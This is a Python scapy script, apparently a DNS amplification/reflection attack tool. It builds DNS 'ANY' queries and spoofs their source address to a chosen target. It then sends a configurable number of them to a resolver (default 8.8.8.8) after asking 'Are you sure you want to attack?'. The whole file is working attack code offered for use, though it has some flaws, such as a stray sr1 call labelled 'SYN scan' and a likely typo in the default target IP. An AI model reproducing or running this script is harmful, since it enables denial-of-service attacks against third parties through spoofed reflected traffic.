from scapy.all import *

from argparse import ArgumentParser
import sys
import os

def construct_IP(DNSaddr):
    # Construct IP packet
    ip = IP()
    ip.dst = DNSaddr
    ip.show()
    return ip

def construct_UDP():
    # Construct UDP packet
    udp = UDP()
    udp.display()
    return udp

def construct_DNS(q):
    # Construct DNS packet
    dns = DNS()
    dns.rd = 1
    dns.qdcount = 1
    # Set DNS Question Record in DNS packet
    dns.qd = q
    dns.display()
    return dns

def construct_DNSQR(qtype, qname):
    # Construct DNS Question Record
    q = DNSQR()
    q.qtype = qtype
    q.qname = qname
    # q.display() ## already displayed as part of construct_DNS(q)
    return q
    
def Set_UP(ip, udp, dns, q, target):

    # Concencate
    # r = (ip/udp/dns) ## unnecessary double
    # r.display() ## unnecessary double

    # Set up r
    r = (ip/udp/dns)
    # SYN scan
    sr1(r)
    r.src = target
    r.display() # complete packet shown twice times (once per layer & once complete packet)
    return r

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-D", "--DNS-server", help="Assign specific DNS server", dest="D", default = '8.8.8.8')
    parser.add_argument("-T", "--Target", help="target server", dest="T", default = '172.0.0.1')
    parser.add_argument("-q", "--query", help="domainname to query", dest="q", default = 'google.com')
    parser.add_argument("-qt", "--querytype", help="type of record to query", dest="qt", type=int, default = 255)
    parser.add_argument("-n", "--number", help="number of packets to send", dest="n", type=int, default = 1)
    args = parser.parse_args()
    print('DNS server: %s' %args.D)
    print('Target: %s' %args.T)
    print('Query: %s' %args.q)
    print('Query Type: %s' %args.qt)
    print('Number of packets: %s' %args.n)

    ip = construct_IP(DNSaddr = args.D)
    udp = construct_UDP()
    q = construct_DNSQR(qtype = args.qt, qname = args.q)
    dns = construct_DNS(q)

    r = Set_UP(ip, udp, dns, q, args.T)
    r = [r]*args.n
    a = 'Y'
    a = input('Are you sure you want to attack ? [Y]/N')
    if (a == 'Y'):
        send(r)
    else:
        exit()
